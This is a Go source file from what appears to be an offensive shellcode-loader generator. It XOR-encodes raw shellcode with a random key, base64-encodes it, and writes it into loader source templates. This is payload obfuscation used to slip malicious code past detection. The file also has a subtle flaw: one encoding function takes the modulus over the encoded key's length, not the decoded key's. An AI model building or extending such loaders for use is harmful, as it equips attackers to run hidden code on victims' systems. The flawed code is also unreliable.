package main

import (
	"bytes"
	"embed"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/rand"
	_ "os"
	"strconv"
	"text/template"
	"time"
)

//go:embed templates/*.go
var tpl_dir embed.FS

type LoaderConfig struct {
	Shellcode        string
	ShellcodeEncoded string
	Size             int
	Key              string
	Debug            bool
}

func encodeString(s string, key string) string {
	key_decoded, _ := base64.StdEncoding.DecodeString(key)
	buffer := make([]byte, 0)
	for i := 0; i < len(s); i++ {
		buffer = append(buffer, byte(int(s[i])^int(key_decoded[i%len(key)])))
	}
	return base64.StdEncoding.EncodeToString(buffer)
}

func encodeByteArray(data []byte, key []byte) []byte {
	buffer := make([]byte, 0)
	for i := 0; i < len(data); i++ {
		buffer = append(buffer, byte(int(data[i])^int(key[i%len(key)])))
	}
	return buffer
}

var funcs = template.FuncMap{"encode": encodeString}

func generateKey(l int) []byte {
	rand.Seed(time.Now().UnixNano())
	key := make([]byte, l)
	rand.Read(key)
	return key
}

func getTemplateFile(tpl string, custom bool) ([]byte, error) {
	if custom {
		loader_tpl, err := ioutil.ReadFile(tpl)
		if err != nil {
			return nil, err
		}
		return loader_tpl, nil
	} else {
		loader_tpl, err := tpl_dir.ReadFile(fmt.Sprintf("templates/%s.go", tpl))
		if err != nil {
			return nil, err
		}
		return loader_tpl, nil
	}
}

func CreateLoader(sc []byte, tpl string, debug bool, custom bool) ([]byte, error) {
	loader_tpl, err := getTemplateFile(tpl, custom)
	if err != nil {
		return nil, err
	}

	key := generateKey(64)
	config := LoaderConfig{
		Shellcode:        createShellcodeString(sc),
		ShellcodeEncoded: base64.StdEncoding.EncodeToString(encodeByteArray(sc, key)),
		Size:             len(sc),
		Key:              base64.StdEncoding.EncodeToString(key), // TODO: change key size
		Debug:            debug,
	}

	gen, err := template.New("loader").Funcs(funcs).Parse(string(loader_tpl))
	if err != nil {
		return nil, err
	}

	var loader_src bytes.Buffer
	err = gen.Execute(&loader_src, config)
	if err != nil {
		return nil, err
	}

	return loader_src.Bytes(), nil
}

func createShellcodeString(data []byte) string {
	var buffer bytes.Buffer
	buffer.WriteString("[]byte{")
	for _, x := range data {
		buffer.WriteString(strconv.Itoa(int(x)))
		buffer.WriteString(",")
	}
	buffer.WriteString("}")
	return buffer.String()
}
